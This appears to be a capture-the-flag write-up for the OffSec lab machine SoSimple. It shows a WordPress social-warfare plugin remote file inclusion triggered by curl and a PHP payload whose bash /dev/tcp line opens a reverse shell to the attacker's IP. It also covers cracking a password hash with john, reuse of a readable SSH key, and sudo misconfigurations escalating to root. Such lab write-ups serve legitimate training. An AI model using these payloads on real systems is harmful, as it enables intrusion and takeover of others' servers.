---
layout: post
category: writeup
---

## Machine Info

- Name: SoSimple
- Description: Keep it Simple
- Difficulty: Intermediate

## Initial Access

Nmap:
```bash
# Nmap 7.94SVN scan initiated Sat Feb 17 16:10:11 2024 as: nmap -sC -sV -v -p- -o nmap --min-rate 1000 192.168.204.78
Nmap scan report for 192.168.204.78
Host is up (0.051s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 5b:55:43:ef:af:d0:3d:0e:63:20:7a:f4:ac:41:6a:45 (RSA)
|   256 53:f5:23:1b:e9:aa:8f:41:e2:18:c6:05:50:07:d8:d4 (ECDSA)
|_  256 55:b7:7b:7e:0b:f5:4d:1b:df:c3:5d:a1:d7:68:a9:6b (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: So Simple
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Website and ssh, let's start by scanning the directories:
```bash
dirsearch -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -e php,txt,html -f -u htt
p://192.168.204.78
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, txt, html | HTTP method: GET | Threads: 64 | Wordlist size: 1102725

Output File: /home/kali/offsec/reports/http_192.168.204.78/_24-02-17_16-20-01.txt

Target: http://192.168.204.78/

[16:20:01] Starting: 
[16:20:03] 403 -  279B  - /icons/                                           
[16:20:09] 301 -  320B  - /wordpress  ->  http://192.168.204.78/wordpress/  
[16:20:09] 200 -    4KB - /wordpress/
```

From there I can run a quick wpscan and find the social-warfare plugin is outdated:

![](assets/images/2024-02-17-offsec-sosimple-writeup-image-1.png)

This is vulnerable to an RFI in this URL:

```
192.168.204.78/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=[RFI_HERE]
```

To pull this off I need to create a payload.txt file with some php code that will send me back a revshell:

```bash
offsec cat payload.txt 
<pre>shell_exec("bash -c 'bash -i >& /dev/tcp/192.168.45.246/443 0>&1'");</pre>
```

Now I can make a request like this:

```bash
curl 192.168.204.78/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.45.246/payload.txt
```

This gets us a rev shell:

```bash
www-data@so-simple:/var/www/html/wordpress$ whoami
www-data
```

## Privilege Escalation

I start by logging in to the wordpress database, the credentials are found in wp-config.php this allows me to look for the user max/admin's credentials. I can also attempt to crack them:

![](assets/images/2024-02-17-offsec-sosimple-writeup-image-2.png)

```bash
john -w=/usr/share/wordlists/rockyou.txt hash   
Created directory: /home/kali/.john                                                                                 
Using default input encoding: UTF-8                       
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])                                               
Cost 1 (iteration count) is 8192 for all loaded hashes                                                              
Will run 8 OpenMP threads                                 
Press 'q' or Ctrl-C to abort, almost any other key for status              
opensesame       (?)                                                                                                
1g 0:00:00:00 DONE (2024-02-17 16:19) 11.11g/s 68266p/s 68266c/s 68266C/s myboo..iheartyou                  
Use the "--show --format=phpass" options to display all of the cracked passwords reliably                           
Session completed.
```

This cracks max's hash successfully! I also notice he's a user on the machine so I attempt to su into him:

```bash
www-data@so-simple:/home/max$ su max
Password: 
su: Authentication failure
www-data@so-simple:/home/max$
```

This fails, so I take a look at their home directory and find two files, the personal.txt file and a directory called "this":

Taking a look at the directory:
```bash
www-data@so-simple:/home/max$ find this
this
this/is
this/is/maybe
this/is/maybe/the
this/is/maybe/the/way
this/is/maybe/the/way/to
this/is/maybe/the/way/to/a
this/is/maybe/the/way/to/a/private_key
this/is/maybe/the/way/to/a/private_key/id_rsa
this/is/maybe/the/way/to/a/rabbit_hole
this/is/maybe/the/way/to/a/rabbit_hole/rabbit-hole.txt
this/is/maybe/the/way/to/a/password
this/is/maybe/the/way/to/a/password/password.txt
```

```bash
www-data@so-simple:/home/max$ cat personal.txt | base64 -d
Hahahahaha, it's not that easy !!! 
```

bit ctfy, but i'll bite... checking permissions:

```bash
www-data@so-simple:/home/max$ ls -la
total 52
drwxr-xr-x 7 max  max  4096 Aug 22  2020 .
drwxr-xr-x 4 root root 4096 Jul 12  2020 ..
lrwxrwxrwx 1 max  max     9 Aug 22  2020 .bash_history -> /dev/null
-rw-r--r-- 1 max  max   220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 max  max  3810 Jul 12  2020 .bashrc
drwx------ 2 max  max  4096 Jul 12  2020 .cache
drwx------ 3 max  max  4096 Jul 12  2020 .gnupg
drwxrwxr-x 3 max  max  4096 Jul 12  2020 .local
-rw-r--r-- 1 max  max   807 Feb 25  2020 .profile
drwxr-xr-x 2 max  max  4096 Jul 14  2020 .ssh
-rw-r--r-- 1 max  max    33 Feb 17 21:09 local.txt
-rw-r--r-- 1 max  max    49 Jul 12  2020 personal.txt
drwxrwxr-x 3 max  max  4096 Jul 12  2020 this
-rwxr-x--- 1 max  max    43 Aug 22  2020 user.txt
```

I see that I can actually access the .ssh directory (x) on world:

```bash
www-data@so-simple:/home/max/.ssh$ ls -la
total 20
drwxr-xr-x 2 max  max  4096 Jul 14  2020 .
drwxr-xr-x 7 max  max  4096 Aug 22  2020 ..
-rw-r--r-- 1 max  max   568 Jul 14  2020 authorized_keys
-rwxr-xr-x 1 root root 2602 Jul 14  2020 id_rsa
-rw-r--r-- 1 root root  568 Jul 14  2020 id_rsa.pub
```

I also can read the ssh key! the weird part is that it's owned by root so i'll take it and attempt to login to root first, then i'll attempt to login to max if that doesn't work

```bash
www-data@so-simple:/home/max/.ssh$ ssh -i id_rsa root@localhost
Could not create directory '/var/www/.ssh'.
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:qo4/EbrJueKB3ta+XB6PT2uNDjKfSgixhQqawjkTPas.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).
root@localhost's password: 

www-data@so-simple:/home/max/.ssh$ ssh -i id_rsa max@localhost
Could not create directory '/var/www/.ssh'.
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:qo4/EbrJueKB3ta+XB6PT2uNDjKfSgixhQqawjkTPas.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Feb 17 21:31:06 UTC 2024

  System load:  0.01              Processes:                171
  Usage of /:   53.6% of 8.79GB   Users logged in:          0
  Memory usage: 31%               IPv4 address for docker0: 172.17.0.1
  Swap usage:   0%                IPv4 address for ens160:  192.168.204.78


47 updates can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

max@so-simple:~$
```

SSHing as root did not work, but I successfully SSH'd as max!

```bash
max@so-simple:~$ sudo -l
Matching Defaults entries for max on so-simple:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User max may run the following commands on so-simple:
    (steven) NOPASSWD: /usr/sbin/service
```

checking sudo privileges I can run "service" as steven so let's do that:

```bash
max@so-simple:~$ sudo -u steven  service ../../bin/sh
$ whoami
steven
```

Now that I am steven 
```bash
steven@so-simple:/home/steven$ sudo -l
Matching Defaults entries for steven on so-simple:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User steven may run the following commands on so-simple:
    (root) NOPASSWD: /opt/tools/server-health.sh
```

I go to the directory and notice it doesn't exist, so I attempt to create it and it works (weird cause we shouldn't have write access to /opt)

```bash
steven@so-simple:/home/steven$ cd /opt
steven@so-simple:/opt$ ls
steven@so-simple:/opt$ ls -la
total 8
drwxr-xr-x  2 steven steven 4096 Sep  3  2020 .
drwxr-xr-x 20 root   root   4096 Aug 14  2020 ..
steven@so-simple:/opt$ mkdir tools
steven@so-simple:/opt$ ls
tools
steven@so-simple:/opt$ cd tools/
steven@so-simple:/opt/tools$ ls
steven@so-simple:/opt/tools$ touch server-health.sh
steven@so-simple:/opt/tools$ echo "bash" > server-health.sh
steven@so-simple:/opt/tools$ sudo /opt/tools/server-health.sh 
root@so-simple:/opt/tools#
```

We are root!

best,
gerbsec